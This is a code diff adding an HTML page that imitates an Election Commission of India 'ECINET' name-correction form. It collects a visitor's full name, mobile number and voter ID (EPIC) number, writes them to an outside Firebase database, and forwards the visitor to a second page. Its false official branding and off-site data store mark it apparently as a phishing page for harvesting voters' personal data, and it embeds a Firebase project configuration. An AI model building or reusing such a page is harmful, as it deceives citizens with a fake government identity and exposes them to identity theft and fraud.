@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ECINET- Home</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body { 
+            background-color: #0056b3; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
+        }
+
+        /* Container for Edge-to-Edge Banner Header */
+        .form-container { 
+            background: #ffffff; 
+            padding: 0 35px 35px 35px; /* Top padding 0 taaki photo kinaron se touch rahe */
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
+            width: 100%; 
+            max-width: 450px; 
+            overflow: hidden; /* Photo box se bahar na nikle */
+        }
+
+        /* Full Width Edge-to-Edge Banner Styling */
+        .full-banner {
+            margin-left: -35px;
+            margin-right: -35px;
+            margin-bottom: 25px;
+            width: calc(100% + 70px);
+            height: 130px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #004085;
+        }
+
+        .full-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Photo sahi shape mein baith jayegi */
+            display: block;
+        }
+
+        /* Updated ECINET Styling for Bold and Large text */
+        .form-container h2 { 
+            text-align: center;
+            margin-bottom: 20px; 
+            color: #0056b3; 
+            font-size: 28px;        /* Size badha diya gaya hai */
+            font-weight: 900;       /* Extra Bold font-weight */
+            letter-spacing: 1.5px;  /* Letters ke beech spacing taaki aur bold dikhe */
+            text-transform: uppercase;
+        }
+
+        .form-group { 
+            margin-bottom: 15px; 
+            text-align: left; 
+        }
+
+        .form-group label { 
+            display: block; 
+            margin-bottom: 6px; 
+            color: #333; 
+            font-weight: 600; 
+            font-size: 13px; 
+        }
+
+        .form-group input { 
+            width: 100%; 
+            padding: 10px 14px; 
+            border: 1px solid #ccc; 
+            border-radius: 6px; 
+            font-size: 14px; 
+            background: #fff; 
+        }
+
+        .form-group input:focus { 
+            outline: none; 
+            border-color: #0056b3; 
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); 
+        }
+
+        .btn-next { 
+            width: 100%; 
+            padding: 12px; 
+            background: #0056b3; 
+            border: none; 
+            border-radius: 6px; 
+            color: white; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 10px; 
+        }
+
+        .btn-next:hover { 
+            background: #004085; 
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            color: #666;
+            font-weight: 600;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        
+        <!-- Full Width Banner Image Header -->
+        <div class="full-banner">
+            <img src="logo.png" alt="Election Commission Banner">
+        </div>
+
+        <h2>ECINET (NAME CORRECTION FORM)</h2>
+        
+        <form id="voterForm">
+            <div class="form-group">
+                <label for="fullname">Full Name (As per Voter ID)*</label>
+                <input type="text" id="fullname" name="fullname" placeholder="Enter full name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="mobile">Mobile Number*</label>
+                <input type="tel" id="mobile" name="mobile" placeholder="Enter mobile number" maxlength="10" required>
+            </div>
+
+            <div class="form-group">
+                <label for="epic">EPIC Number (Voter ID Number)*</label>
+                <input type="text" id="epic" name="epic" placeholder="Enter EPIC number" required>
+            </div>
+
+            <button type="submit" class="btn-next">Next</button>
+        </form>
+
+        <div class="footer-text">
+            © 2026 Election Commission of India. All rights reserved.
+        </div>
+    </div>
+
+    <!-- Firebase SDK aur Data Saving Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
+            authDomain: "voter-verification-a04d5.firebaseapp.com",
+            projectId: "voter-verification-a04d5",
+            storageBucket: "voter-verification-a04d5.firebasestorage.app",
+            messagingSenderId: "582458013788",
+            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
+            measurementId: "G-8CX5BVQXFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        document.getElementById('voterForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fullname = document.getElementById('fullname').value;
+            const mobile = document.getElementById('mobile').value;
+            const epic = document.getElementById('epic').value;
+
+            try {
+                const docRef = await addDoc(collection(db, "voterSubmissions"), {
+                    fullname: fullname,
+                    mobile: mobile,
+                    epic: epic,
+                    time: new Date().toLocaleString()
+                });
+
+                localStorage.setItem('voterDocId', docRef.id);
+                window.location.href = "secondpage.html";
+            } catch (error) {
+                console.error("Error adding document: ", error);
+                alert("Data save karne me samasya aayi hai, kripya dobara prayas karein.");
+            }
+        });
+    </script>
+</body>
+</html>
